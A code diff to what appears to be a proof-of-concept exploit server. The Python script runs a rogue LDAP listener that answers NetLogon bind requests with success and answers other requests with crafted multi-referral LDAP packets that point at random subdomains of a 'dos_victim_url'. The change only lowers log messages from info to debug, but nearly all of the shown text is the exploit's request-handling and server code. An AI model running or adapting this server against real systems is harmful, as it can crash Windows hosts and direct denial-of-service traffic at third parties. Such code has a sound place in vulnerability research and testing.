@@ -61,7 +61,7 @@ def handle_connection(conn, addr, count, dos_victim_url):
     referrals = [f'ldap://{str(uuid.uuid4())}.{dos_victim_url}' for _ in range(count)]
     buffer = bytearray()
 
-    logger.info(f"NetLogon connected from {addr}")
+    logger.debug(f"NetLogon connected from {addr}")
 
     while True:
         data = conn.recv(4096)
@@ -82,10 +82,10 @@ def handle_connection(conn, addr, count, dos_victim_url):
         del buffer[:length_consumed]
         request = ldap_message.value
 
-        logger.info("Received LDAP request from NetLogon")
+        logger.debug("Received LDAP request from NetLogon")
 
         if isinstance(request, pureldap.LDAPBindRequest):
-            logger.info("Processing LDAP bind request")
+            logger.debug("Processing LDAP bind request")
 
             bind_response = pureldap.LDAPBindResponse(
                 resultCode=0,
@@ -98,33 +98,33 @@ def handle_connection(conn, addr, count, dos_victim_url):
             )
             response_bytes = response_message.toWire()
 
-            logger.info(f"Sending LDAP bind success response to {addr}")
+            logger.debug(f"Sending LDAP bind success response to {addr}")
             conn.sendall(response_bytes)
 
         else:
-            logger.info("Processing non-bind LDAP request as malicious referral")
+            logger.debug("Processing non-bind LDAP request as malicious referral")
 
             vulnerable_ldap_packet = get_multi_referral_ldap_packet(ldap_message.id, referrals)
 
-            logger.info(f"Sending malicious LDAP response packet to {addr}")
+            logger.debug(f"Sending malicious LDAP response packet to {addr}")
             conn.sendall(vulnerable_ldap_packet)
 
     conn.close()
-    logger.info("Connection closed")
+    logger.debug("Connection closed")
 
 
 def run_server(listen_port: int, count: int, dos_victim_url: str):
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.bind(('0.0.0.0', listen_port))
     server_socket.listen(5)
-    logger.info(f"TCP LDAP server listening on 0.0.0.0:{listen_port}")
+    logger.debug(f"TCP LDAP server listening on 0.0.0.0:{listen_port}")
 
     try:
         while True:
             conn, addr = server_socket.accept()
             threading.Thread(target=handle_connection, args=(conn, addr, count, dos_victim_url)).start()
     except KeyboardInterrupt:
-        logger.info("Server shutting down due to KeyboardInterrupt")
+        logger.debug("Server shutting down due to KeyboardInterrupt")
     finally:
         server_socket.close()
-        logger.info("Server has been shut down.")
+        logger.debug("Server has been shut down.")
